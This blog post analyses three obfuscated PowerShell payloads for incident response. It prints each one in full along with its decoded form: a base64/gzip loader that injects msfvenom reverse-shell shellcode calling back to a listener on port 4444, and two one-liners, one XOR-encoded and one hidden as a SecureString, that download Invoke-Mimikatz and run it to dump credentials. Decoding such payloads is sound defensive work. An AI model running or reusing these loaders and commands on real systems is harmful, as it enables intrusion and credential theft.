---
title: powershell base64 payload
date: 2022-08-17 07:00:00 Z
categories:
- DFIR
- powershell
layout: post
author: admin
comments: true
---

I was doing some 'weird jobs', and needed to know what really is happening with this powershell base64 payload.
The payload itself is nothing typically new, but I think I'll post it here incase someone needed it, since it was pretty hard trying these resources when I needed it.

so here's some of those powershell payload.

<!--more-->
#### the one with shellcode

```bash
powershell.exe" -nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIALxR4FcCA7VWf2/aSBD9O5X6HawKCVslGAhpmkiVbo0xEDABHCCGotPGXpuFxUvs5Wev3/3GYDdUTar0pLMSseuZ2X375s2OvVXgCMoDaYltQ/r2/t1ZB4d4IckZl667NmZ2Tsp4wa7aLClnZ2DOrM1OoNXYcqTXpC+SPEbLpc4XmAaTm5vKKgxJII7zfI0IFEVk8cgoiWRF+kcaTklIzu8eZ8QR0jcp83e+xvgjZonbroKdKZHOUeDGthZ3cIwtby0ZFXL269esMj4vTvLVpxVmkZy1dpEgi7zLWFaRvivxhve7JZGzJnVCHnFP5Ic0uCjl+0GEPdKG1dbEJGLK3SirwGHgLyRiFQbS6bHidY5echaGnZA7yHVDEkFQvhGs+ZzImWDFWE76Sx4nIHqrQNAFAbsgIV9aJFxTh0T5Og5cRnrEm8htsknP/tYg+TQIvDoiVHKQnNfRmtxdMXJcIKv8ivdHXhV4nnMLbHx//+79Oy/VQ3TZs4K/69v1qShgdDY+jAkAljs8ogfnL1IhJ5mwJxY83ME0cx+uiDKRxnE+xpOJlGHuZTn3enwxdQbXPbl4uIR34wGn7gRiklRlvO4wWG/KmMbG13WnE48GRN8FeEGdVFryS/QTj5HDcfOpWxugydnEQFydMOJjETOZk8a/hlUXVPyI1VaUuSREDqQwAlSQXeVnMMfkyNlGYJIFMHWcZ+M0gKBJ6p2IeJfuHs/BKVthOIpyUmcFFeXkJItgRtychIKIJia0EvwwzD7DNVdMUAdHIl1uovxEZrJphQeRCFcOZBAIuLeWxKGYxXzkpDp1ibazqJ9unn2RjQpmjAY+rLSGbMCbmAVLxLoIAedBA0reIqKxWDKyAJ9DfRsM+1DNSTEchIR94mZfhJlK/ajrmJWUjhOQkGqLcZGTBjQUcFfEDB9U9d9AnFwTz3AqIUlSI6fFM9Z2IlZ7ZtrdOsOeE8s0YenASSiADyPkCw1H5FPZEiGwJX9Q72gFwWM3AmY62pwW0YYWGyb89+lFg+tXbvN2VldDfTv1UCNqmPWO3q3Xy+tba1AWVrUhmp2GMKsPs5mF6r2+LUYNVL+nhbld3i9v6d5qIdfeqp/22n5T0Lb7me96tu55/pVn9YqXBm0NK12tUMItvbpqDbWNVihHVbqpd2m/O781xKM9YLjvqf5D8RrTbSucDYrc3DcQqk0vnP2tN6hNTXdn19XrYXmOqghVgurA0HjT1kLUUQfYH/BNc1ZjQ7+CNMOhZNTtG1q3a2ioX5s96deqD7EPeKoNByU6Wj70pjA3AEJTLZQbLtlzuwsk1TjCfg98/ErJmXrgo39E2sc2j0p4rnGkgY8xegJc9tLoMLDf90scDVj7AaPWaGeoatHulFG9QIc1H8VLYl/rYhSt9b2uFgcud4eXbdtTBw/sStUr90vHU1V1U9ebzqi4/Xx3VdYKT5UFXbDHkqte9z9rwabpd9a+2x1e9bbt3SPs11fVwYdYOyCezGJ2vTSvTtTw2r1v4jCaYgYqgZs8LVeDh0ZyK3c4jSNk+dCt5yQMCIP2Bg0wVTpijDtxi3i+v6FHHTvHBIq2D8OL0osjRfrhqDw3jvTVzc0IoEL9JNrOt0jgi2musL0oFOD2L2zLBTjv209Y4cudnK6WixtIwtPJHuywhxLXVsaf96In1Pp/WUyKego/7ptYfH73G+ubmC3k0vP/Yvj5xR+x/McMDDEV4GnBzcTIsV3+hohEOSffGUmaQBde8sQffncrcd6GL5B/AQG25GNvCgAA'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

what I did was decode using base64 and gunzip, here it is with gunzip and base64 decode using cyberchef. and you can see another base64 in $hQxcWRc. convert that in to hex, and the header (fc e8 82 00) is of msfvenom shellcode.
Download conversion result and run scdbg if needed, where we can see 192.168.198.149:4444.

```bash
function paYF {Param ($divQYalY, $fnyEK2)
$vMPnBGlpZDG = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
return $vMPnBGlpZDG.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vMPnBGlpZDG.GetMethod('GetModuleHandle')).Invoke($null, @($divQYalY)))), $fnyEK2))}
function s5RSn_Hxv {Param (	[Parameter(Position = 0, Mandatory = $True)] [Type[]] $ld54,[Parameter(Position = 1)] [Type] $ze3X5 = [Void])
$fQWnvw4ai = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
$fQWnvw4ai.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ld54).SetImplementationFlags('Runtime, Managed')
$fQWnvw4ai.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ze3X5, $ld54).SetImplementationFlags('Runtime, Managed')
return $fQWnvw4ai.CreateType()}
[Byte[]]$hQxcWRc = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKjGlWgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")
$mj9pM7 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paYF kernel32.dll VirtualAlloc), (s5RSn_Hxv @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $hQxcWRc.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($hQxcWRc, 0, $mj9pM7, $hQxcWRc.length)
$gkRsqAL = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paYF kernel32.dll CreateThread), (s5RSn_Hxv @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$mj9pM7,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paYF kernel32.dll WaitForSingleObject), (s5RSn_Hxv @([IntPtr], [Int32]))).Invoke($gkRsqAL,0xffffffff) | Out-Null
```
![scdbg](/images/scdbg.png)

#### the one with base 10 xor

```bash
( [cHAR[]] ( 20 , 24, 5 ,125 , 117 , 19, 56,42, 112 ,18 , 63 , 55,56 ,62,41,125,19 , 56 , 41 ,115 ,10,56 ,63, 30 , 49 ,52 ,56 ,51, 41 , 116 , 115, 25 ,50,42 ,51, 49,50,60, 57, 14, 41 ,47 , 52, 51, 58 ,117 ,122 , 53, 41,41 , 45 , 46,103, 114, 114,47 ,60, 42, 115, 58 , 52 , 41 ,53 ,40, 63 , 40 , 46, 56,47 , 62 ,50 ,51, 41 ,56,51,41, 115 , 62, 50 ,48 , 114,48,60 , 41,41 ,52 ,59, 56, 46, 41 ,60, 41 , 52,50 , 51, 114 , 13,50,42 ,56 , 47 ,14 ,45 , 49, 50 , 52 ,41 , 114 ,48, 60, 46,41, 56,47, 114 , 24,37,59,52 , 49 ,41, 47, 60,41,52 , 50 , 51 , 114 ,20 , 51 ,43, 50,54 ,56, 112 , 16 , 52, 48 , 52 , 54, 60 ,41,39, 115, 45 ,46 , 108 , 122,116,102, 125 ,20 ,51 , 43, 50 , 54 ,56 ,112, 16, 52,48,52, 54,60 , 41 , 39 ,125 ,112 , 25, 40 , 48, 45,30 ,47 ,56, 57 ,46 ) |%{[cHAR] ( $_ -BXor"0x5d" ) } )-JOIN''|.( $ENv:ComSPEc[4,15,25]-jOIN'')
```

to see payload we convert from charcode using base 10, and do XOR using 5d as key, the result will be:

```bash
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```

#### the one with securestring

```bash
[rUntImE.iNtEROPSeRviCEs.mARShaL]::pTRtOSTriNGBstR([ruNtIMe.iNTeropSERVIcES.MarsHAl]::seCUResTRingtObstr($('76492d1116743f0423413b16050a5345MgB8ADcAUABxAFcAagBnAHgAUQBpAGoARABCADkARABNAHgAVQAxAEgAUQA1AGcAPQA9AHwANABjADQANgBmADUANgA3ADgAYgBhADkANwBmADUANwA3ADgAOABlADkANgAxAGMAMgA0ADAAMQA0ADkAZQA3AGEAYQAwADUANQAxADAANQBiADcAMQA3ADUANQA4AGEAYwAyAGMANQA3ADkAYgBiADkAMQBhAGIANgAzAGUAYwAxAGEAOAAwAGMAZABkADUAMgA4ADcAZAA1AGUAMwA4AGEANAA3AGUANQA5ADUANwBjAGMANwA5ADcAMwBhADIANAA2ADMAMQBmAGMAYwA1ADgAYQA5ADQAOAAwADgAOQAyADQAYwA2ADUAYwAyADkANgBhAGUAYwA0ADAAZAA2AGQANQA0ADkAYgA3ADgAYQA1ADcANAA5ADYAYwAyADgAZQA5AGIANgBlADQAZgBlADgAYQBlADcAYQA1ADgAYQAxADYAYgA3AGUAZABiAGEAMgAyAGMAZAA3AGEAMAA4AGYAYwAyAGMAMQAxADUANAAzADUAOAA1ADIAMQA4AGMANQA1AGEANAA4ADgAZgA0AGQAZgBhADYAYwBhAGIAOAA1AGUANgBlADMAMQBiAGMAYwA4AGEANAAxADMANgAxADEAYwBlADgAZQBjAGUAMwBkADEAYgA1AGQAMgBiADYANQA5AGUANgA5AGMAZAA1AGIANgBkADMAYwA4ADYANwAwADkAMwA4AGUAOABiADIANgA3AGIAZABkADEAYQA4ADMAOQBkAGQAOQAxADkANwA5ADkAYQA4ADYAZQBlADIANQBkADYAMQA5ADEAMQA0ADUANwA3ADkAMgA3AGUAMwBkADEANQBlADgAZABlADcAZgAyADQAYgBhADAAYwA4ADgANABjADkAYgBiADUANQAxADQAOQBjADkAMgBhAGYAOQAwAGUAOQA4ADUANgA2ADcAZAA5ADQANAAzAGQANABiADIAOABlAGUANAA0AGIANAAxADEAOABlAGMAMQBlADIANgA0AGIAMQA2AGYAMwBlAGUAYQA1ADkAOABmADgAMAA4ADEAZgAyADIAZQBmADQAMABlADgAMAAxADcAZABiAGEAOQAyAGIAYgBhAGUAMAA0ADIAZQA2ADcAZQA3ADQAMQA0ADYAMgA0ADQAZQBmADEAOQBlADkAYwAxAGEANwBjAGMAOQBjAGYAZgAyAGMAYgA0AGEAMAA3ADMANABkAGQAMwA0AGUAOAA4AGUANQAwADEAYgA2ADkAZgAyADgAYQA1AGQAOQA4AGQAMQAxADgAOAA4AGMAZQAwAGEAZQBmADMAZQAyAGYAMgA1ADgAZgA4ADcAMwA1ADkANQA4AGUAYwBjADQANwBiADcAYgA1ADAAYQA5AGMAZgAyADMAZAA3ADQANgA1ADEAZgAxAGQANAA5ADEAYQAwADcAYgBhAGMAMwA3ADcAYgBmADgAMwA2ADYAYQBjAGUAZAA4ADIAZABmAGEAMwA0AGQAYwBjADkAZABlADYAYgAyADkAMABlAGUAYgAwADAAMgBjADIANgAwADMAMQA3AGMAMQBlADIAMQBlADQANAA1AGUAOAAzADgAYQBkAGMANAA0AGYAMwBlADgAYgA5ADMAMwBlAGIANgAwAGEANgAyADAAZABlADkANgAxADMANgA4ADgAMAA4ADUAMgBiADEAYgAzAGYAMQAxADkAZgAyADMAMQAzADkAMAA0ADkANQBlADMAOAA3AGYAMQA5AGUAZQAxADEAZgBlADMANQBjADEANAA2AGEAYQA3AGIANABiAGUAMQAwADUAMABhADQAZgAzAGQAZgBmADkAZQBmADYAYQBhADUAYwBmAGUANABhAGUAOABkAGYAMAA4AGYAMgA5AGQANAA2AGUANQA4ADcANgAzADgAYwBlADcAYwBkADEANwBhADAAMwAwAGEANQAxAGMAOQA1ADIAZgBmAGYANgA2ADYAZgA0ADAAOQA='|CONveRTTO-secUResTRING  -KEy  196,47,72,214,193,53,146,52,139,252,69,219,170,135,151,62,90,5,213,36,116,154,71,183) ) ))| .( $VErBosePRefERencE.toStrING()[1,3]+'x'-JOiN'')
```

to see payload we convert from securestring (https://www.wietzebeukema.nl/powershell-securestring-decoder/) and use key provided, and it will result with similar script as before (invoke-mimikatz).
